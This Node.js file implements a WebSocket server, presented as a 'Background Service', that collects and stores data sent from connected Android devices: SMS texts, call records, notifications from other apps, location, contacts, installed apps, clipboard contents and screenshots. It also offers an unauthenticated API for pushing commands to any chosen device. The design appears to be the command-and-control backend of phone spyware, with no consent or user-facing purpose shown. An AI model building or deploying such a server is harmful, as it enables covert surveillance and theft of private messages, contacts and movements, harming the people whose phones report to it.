const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

// Create HTTP server for health checks and API endpoints
const server = http.createServer((req, res) => {
  // Health check endpoint for Railway
  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
      status: 'ok', 
      clients: wss.clients.size,
      uptime: process.uptime(),
      timestamp: new Date().toISOString()
    }));
    return;
  }
  
  // API endpoint to get connected devices
  if (req.url === '/api/devices') {
    const devices = Array.from(clients.values()).map(client => ({
      id: client.id,
      deviceInfo: client.deviceInfo,
      connectedAt: client.connectedAt,
      lastActivity: client.lastActivity
    }));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ devices, total: devices.length }));
    return;
  }
  
  // API endpoint to send command to specific device
  if (req.url.startsWith('/api/command/') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      const deviceId = req.url.split('/api/command/')[1];
      const command = JSON.parse(body);
      
      let sent = false;
      wss.clients.forEach((ws) => {
        const clientInfo = clients.get(ws);
        if (clientInfo && clientInfo.id === deviceId && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify(command));
          sent = true;
        }
      });
      
      res.writeHead(sent ? 200 : 404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: sent, deviceId }));
    });
    return;
  }
  
  // Default response
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Background Service WebSocket Server');
});

// Create WebSocket server
const wss = new WebSocket.Server({ server });

// Store connected clients with metadata
const clients = new Map();

wss.on('connection', (ws, req) => {
  const clientId = generateClientId();
  const clientData = {
    id: clientId,
    connectedAt: new Date().toISOString(),
    lastActivity: new Date().toISOString(),
    deviceInfo: null,
    services: []
  };
  
  clients.set(ws, clientData);
  
  console.log(`📱 Device connected: ${clientId}`);
  console.log(`📊 Total connected devices: ${clients.size}`);

  // Send welcome/configuration
  ws.send(JSON.stringify({
    type: 'connection_established',
    clientId: clientId,
    serverTime: new Date().toISOString(),
    heartbeatInterval: 30000 // 30 seconds
  }));

  // Handle all incoming messages
  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data);
      const clientInfo = clients.get(ws);
      clientInfo.lastActivity = new Date().toISOString();
      
      console.log(`📨 [${clientId}] ${message.type}:`, message);

      // Route to appropriate handler based on message type
      switch(message.type) {
        case 'sms_received':
          handleSMSMessage(ws, clientInfo, message);
          break;
          
        case 'call_state':
          handleCallState(ws, clientInfo, message);
          break;
          
        case 'notification':
          handleNotification(ws, clientInfo, message);
          break;
          
        case 'location_update':
          handleLocationUpdate(ws, clientInfo, message);
          break;
          
        case 'device_info':
          handleDeviceInfo(ws, clientInfo, message);
          break;
          
        case 'battery_status':
          handleBatteryStatus(ws, clientInfo, message);
          break;
          
        case 'contact_sync':
          handleContactSync(ws, clientInfo, message);
          break;
          
        case 'app_usage':
          handleAppUsage(ws, clientInfo, message);
          break;
          
        case 'clipboard':
          handleClipboardData(ws, clientInfo, message);
          break;
          
        case 'screenshot':
          handleScreenshot(ws, clientInfo, message);
          break;
          
        case 'ping':
          ws.send(JSON.stringify({ 
            type: 'pong', 
            serverTime: new Date().toISOString(),
            clientId: clientId
          }));
          break;
          
        case 'log':
          handleLog(ws, clientInfo, message);
          break;
          
        default:
          handleCustomMessage(ws, clientInfo, message);
      }
    } catch (error) {
      console.error('❌ Invalid message format:', error);
      ws.send(JSON.stringify({ 
        type: 'error', 
        message: 'Invalid message format',
        details: error.message 
      }));
    }
  });

  // Handle disconnect
  ws.on('close', (code, reason) => {
    const clientInfo = clients.get(ws);
    console.log(`🔌 Device disconnected: ${clientInfo.id} (Code: ${code})`);
    console.log(`📊 Remaining devices: ${clients.size - 1}`);
    clients.delete(ws);
  });

  // Handle errors
  ws.on('error', (error) => {
    const clientInfo = clients.get(ws);
    console.error(`⚠️ Error for device ${clientInfo?.id}:`, error);
    clients.delete(ws);
  });
});

// ====== MESSAGE HANDLERS ======

function handleSMSMessage(ws, clientInfo, message) {
  console.log(`📱 SMS from ${message.sender}: ${message.content}`);
  
  // Store SMS (you can add database storage here)
  storeData('sms', {
    deviceId: clientInfo.id,
    sender: message.sender,
    content: message.content,
    timestamp: message.timestamp || new Date().toISOString(),
    type: message.smsType || 'inbox'
  });
  
  // Send acknowledgment
  ws.send(JSON.stringify({
    type: 'sms_acknowledged',
    messageId: message.messageId || Date.now().toString(),
    status: 'received'
  }));
  
  // Forward to web dashboard if connected
  broadcastToDashboard({
    type: 'new_sms',
    deviceId: clientInfo.id,
    data: message
  });
}

function handleCallState(ws, clientInfo, message) {
  console.log(`📞 Call state: ${message.state} - ${message.phoneNumber || 'Unknown'}`);
  
  storeData('calls', {
    deviceId: clientInfo.id,
    phoneNumber: message.phoneNumber,
    state: message.state, // 'ringing', 'ongoing', 'ended'
    duration: message.duration,
    timestamp: message.timestamp || new Date().toISOString()
  });
  
  ws.send(JSON.stringify({
    type: 'call_state_acknowledged',
    status: 'received'
  }));
}

function handleNotification(ws, clientInfo, message) {
  console.log(`🔔 Notification from ${message.appName}: ${message.title}`);
  
  storeData('notifications', {
    deviceId: clientInfo.id,
    appName: message.appName,
    packageName: message.packageName,
    title: message.title,
    content: message.content,
    timestamp: message.timestamp || new Date().toISOString()
  });
  
  ws.send(JSON.stringify({
    type: 'notification_acknowledged',
    status: 'received'
  }));
}

function handleLocationUpdate(ws, clientInfo, message) {
  console.log(`📍 Location: ${message.latitude}, ${message.longitude}`);
  
  storeData('locations', {
    deviceId: clientInfo.id,
    latitude: message.latitude,
    longitude: message.longitude,
    accuracy: message.accuracy,
    speed: message.speed,
    timestamp: message.timestamp || new Date().toISOString()
  });
  
  ws.send(JSON.stringify({
    type: 'location_acknowledged',
    status: 'received'
  }));
}

function handleDeviceInfo(ws, clientInfo, message) {
  console.log(`📱 Device info updated for ${clientInfo.id}`);
  
  clientInfo.deviceInfo = {
    model: message.model,
    manufacturer: message.manufacturer,
    androidVersion: message.androidVersion,
    appVersion: message.appVersion,
    batteryLevel: message.batteryLevel,
    networkType: message.networkType,
    isCharging: message.isCharging
  };
  clientInfo.services = message.activeServices || [];
  
  ws.send(JSON.stringify({
    type: 'device_info_acknowledged',
    status: 'received'
  }));
  
  broadcastToDashboard({
    type: 'device_updated',
    deviceId: clientInfo.id,
    deviceInfo: clientInfo.deviceInfo
  });
}

function handleBatteryStatus(ws, clientInfo, message) {
  console.log(`🔋 Battery: ${message.level}% (Charging: ${message.isCharging})`);
  
  storeData('battery', {
    deviceId: clientInfo.id,
    level: message.level,
    isCharging: message.isCharging,
    temperature: message.temperature,
    timestamp: new Date().toISOString()
  });
}

function handleContactSync(ws, clientInfo, message) {
  console.log(`👤 Contacts sync: ${message.contacts?.length || 0} contacts`);
  
  storeData('contacts', {
    deviceId: clientInfo.id,
    contacts: message.contacts,
    totalContacts: message.totalContacts,
    timestamp: new Date().toISOString()
  });
  
  ws.send(JSON.stringify({
    type: 'contacts_acknowledged',
    synced: message.contacts?.length || 0
  }));
}

function handleAppUsage(ws, clientInfo, message) {
  console.log(`📱 App usage from ${clientInfo.id}`);
  
  storeData('app_usage', {
    deviceId: clientInfo.id,
    installedApps: message.installedApps,
    screenTime: message.screenTime,
    timestamp: new Date().toISOString()
  });
  
  ws.send(JSON.stringify({
    type: 'app_usage_acknowledged',
    status: 'received'
  }));
}

function handleClipboardData(ws, clientInfo, message) {
  console.log(`📋 Clipboard data from ${clientInfo.id}: ${message.content.substring(0, 50)}...`);
  
  storeData('clipboard', {
    deviceId: clientInfo.id,
    content: message.content,
    timestamp: message.timestamp || new Date().toISOString()
  });
}

function handleScreenshot(ws, clientInfo, message) {
  console.log(`📸 Screenshot received from ${clientInfo.id}`);
  
  // For base64 images, you might want to save to file
  if (message.imageData) {
    const filename = `screenshot_${clientInfo.id}_${Date.now()}.png`;
    // Save to disk or cloud storage
    storeData('screenshots', {
      deviceId: clientInfo.id,
      filename: filename,
      timestamp: new Date().toISOString()
    });
  }
  
  ws.send(JSON.stringify({
    type: 'screenshot_acknowledged',
    status: 'received'
  }));
}

function handleLog(ws, clientInfo, message) {
  console.log(`📝 Log from ${clientInfo.id} [${message.level}]: ${message.message}`);
  
  storeData('logs', {
    deviceId: clientInfo.id,
    level: message.level,
    tag: message.tag,
    message: message.message,
    timestamp: message.timestamp || new Date().toISOString()
  });
}

function handleCustomMessage(ws, clientInfo, message) {
  console.log(`📨 Custom message type: ${message.type}`);
  
  ws.send(JSON.stringify({
    type: `${message.type}_acknowledged`,
    status: 'received',
    echo: message
  }));
}

// ====== UTILITY FUNCTIONS ======

function generateClientId() {
  return `device_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

function storeData(category, data) {
  // Create logs directory if it doesn't exist
  const logsDir = path.join(__dirname, 'logs');
  if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
  }
  
  // Store data to file (replace with database in production)
  const filename = path.join(logsDir, `${category}_${new Date().toISOString().split('T')[0]}.log`);
  fs.appendFileSync(filename, JSON.stringify(data) + '\n');
  
  console.log(`💾 Data stored in ${category} log`);
}

function broadcastToDashboard(message) {
  // If you have a web dashboard, send updates to all connected dashboard clients
  wss.clients.forEach((ws) => {
    const clientInfo = clients.get(ws);
    if (clientInfo && clientInfo.deviceInfo?.type === 'dashboard' && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(message));
    }
  });
}

// ====== HEARTBEAT MECHANISM ======

const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      console.log('💀 Terminating dead connection');
      return ws.terminate();
    }
    
    ws.isAlive = false;
    ws.ping();
    
    // Send heartbeat
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'heartbeat',
        serverTime: new Date().toISOString()
      }));
    }
  });
}, 30000);

// Handle pong responses
wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.on('pong', () => {
    ws.isAlive = true;
  });
});

wss.on('close', () => {
  clearInterval(interval);
});

// ====== SERVER STARTUP ======

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log('='.repeat(50));
  console.log('🚀 Background Service WebSocket Server');
  console.log('='.repeat(50));
  console.log(`📡 WebSocket server running on port ${PORT}`);
  console.log(`💚 Health check: http://localhost:${PORT}/health`);
  console.log(`📱 Devices API: http://localhost:${PORT}/api/devices`);
  console.log('='.repeat(50));
  console.log('Supported services:');
  console.log('  📱 - SMS Reading');
  console.log('  📞 - Call Monitoring');
  console.log('  🔔 - Notification Access');
  console.log('  📍 - Location Tracking');
  console.log('  🔋 - Battery Monitoring');
  console.log('  👤 - Contact Access');
  console.log('  📱 - App Usage Stats');
  console.log('  📋 - Clipboard Monitoring');
  console.log('  📸 - Screenshot Capture');
  console.log('  📝 - Custom Logging');
  console.log('='.repeat(50));
});
